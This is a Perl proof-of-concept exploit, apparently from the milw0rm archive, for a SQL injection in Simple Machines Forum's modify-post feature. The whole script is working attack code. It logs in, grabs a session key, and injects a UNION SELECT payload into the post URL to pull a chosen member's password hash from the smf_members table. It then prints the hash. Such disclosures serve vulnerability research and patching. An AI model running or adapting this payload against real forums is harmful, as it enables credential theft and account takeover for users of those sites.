#!/usr/bin/perl -w
################################################################################
# SMF Modify SQL Injection // All Versions // By James http://www.gulftech.org #
################################################################################
# Simple proof of concept for the modify post SQL Injection issue I discovered #
# in Simple Machine Forums. Supply this script with your username password and #
# the complete url to a post you made, and have permission to edit. 06/19/2005 #
################################################################################

use LWP::UserAgent;

if ( !$ARGV[3] ) 
{
	print "Usage: smf.pl user pass target_uid modify_url\n";
	exit;
}

print "###################################################\n";
print "# Simple Machine Forums Modify Post SQL Injection #\n";
print "###################################################\n";

my $user = $ARGV[0]; # your username
my $pass = $ARGV[1]; # your password
my $grab = $ARGV[2]; # the id of the target account
my $post = $ARGV[3]; # the entire url to modify a post you made
my $dump = '%20UNION%20SELECT%20memberName,0,passwd,0,0%20FROM%20smf_members%20WHERE%20ID_MEMBER=' . $grab . '/*';
   $post =~ s/msg=([0-9]{1,10})/msg=$1$dump/;
my $path = ( $post =~ /^(.*)\/index\.php/) ? $1: die("[!] The post url you entered seems invalid!\n");

my $ua = new LWP::UserAgent;
   $ua->agent("SMF Hash Grabber v1.0" . $ua->agent);

$ua->cookie_jar({});

print "[*] Trying $path ...\n";

my $req = new HTTP::Request POST => $path . "/index.php?action=login2";
   $req->content_type('application/x-www-form-urlencoded');
   $req->content('user=' . $user . '&passwrd=' . $pass . '&cookielength=-1');
my $res = $ua->request($req); 

print "[*] Logging In ...\n";

# When a correct login is made, a redirect is issued, and no 
# text/html is sent to the browser really. We put 1024 to be
# safe. This part can be altered in case of modded installs!
if ( length($res->content) < 1024 )
{
	print "[+] Successfully logged in as $user \n";
	my $sid = $ua->get($path . '/index.php?action=profile;sa=account');	

	# We get our current session id to be used
	print "[*] Trying To Get Valid Sesc ID \n";
	if ( $sid->content =~ /sesc=([a-f0-9]{32})/ )
	{
		# Replace the old session parameter with the
		# new one so we do not get an access denied!
		my $sesc = $1;
		   $post =~ s/sesc=([a-f0-9]{32})/sesc=$sesc/;

		print "[+] Valid Sesc Id : $sesc\n";
		print "[*] Trying to get password hash ...\n";

		my $pwn = $ua->get($post);	
		if ( $pwn->content =~ />([a-z0-9]{32})<\//i )
		{
			print "[+] Got the password hash!\n";
			print "[+] Password Hash : $1\n";
		}
		else
		{
			print "[!] Exploit Failed! Try manually verifying the vulnerability \n";
		}
	}
	else
	{
		print '[!] Unable to obtain a valid sesc key!!';
		exit;
	}
}
else
{
	print '[!] There seemed to be a problem logging you in!';
	exit;
}

# milw0rm.com [2005-06-21]